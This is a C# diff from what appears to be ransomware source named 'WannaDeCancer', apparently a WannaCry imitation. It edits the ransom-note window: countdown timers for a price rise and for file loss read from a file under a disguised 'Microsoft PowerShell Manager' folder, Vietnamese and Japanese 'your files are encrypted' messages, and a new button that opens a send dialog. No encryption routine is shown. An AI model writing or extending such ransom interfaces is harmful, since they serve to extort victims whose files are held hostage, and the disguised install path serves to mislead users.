@@ -67,18 +67,10 @@ namespace WannaDeCancer
             }
 
             //Get the time information
-            string getTime = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt", EncodeType.UTF);
-            string[] split = getTime.Split('\r');
-
-            for (int i = 1; i < split.Length; i++)
-            {
-                split[i].Substring(1);
-            }
+            string[] split = Static.SplitLineFromString(Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt", EncodeType.UTF));
             lbRaiseExpired.Text = split[1].Substring(7);
-            lbLostExpire.Text = split[2].Substring(7);
+            lbLostExpire.Text = split[2].Substring(6);
         }
-
-        
 
         /// <summary>
         /// Change the txbDecription to desired Languges
@@ -109,7 +101,7 @@ namespace WannaDeCancer
                 case "日本語":
                     //ko co wifi dich sau
                     txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\JP.txt", EncodeType.Unicode);
-                    lbTitle.Text = "Ôiiiiiiiiiii! File của bạn đã bị mã hóa";
+                    lbTitle.Text = "お使いのファイルは暗号化されています。";
                     lbDesLost.Text = "File của bạn sẽ bị mất vào:";
                     lbDesRaise.Text = "Tăng giá vào:";
                     lbDesTimeLeftRaise.Text = "Thời gian còn lại:";
@@ -143,7 +135,7 @@ namespace WannaDeCancer
             try
             {
                 raise = (DateTime)dateTimeConverter.ConvertFromString(Static.SplitLineFromString(Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt", EncodeType.UTF))[1].Substring(7));
-                lost = (DateTime)dateTimeConverter.ConvertFromString(Static.SplitLineFromString(Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt", EncodeType.UTF))[2].Substring(7));
+                lost = (DateTime)dateTimeConverter.ConvertFromString(Static.SplitLineFromString(Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt", EncodeType.UTF))[2].Substring(6));
             }
             catch
             {
@@ -168,5 +160,11 @@ namespace WannaDeCancer
             Description();
         }
         #endregion
+
+        private void btnSend_Click(object sender, EventArgs e)
+        {
+            FormSend formSend = new FormSend();
+            formSend.ShowDialog();
+        }
     }
 }
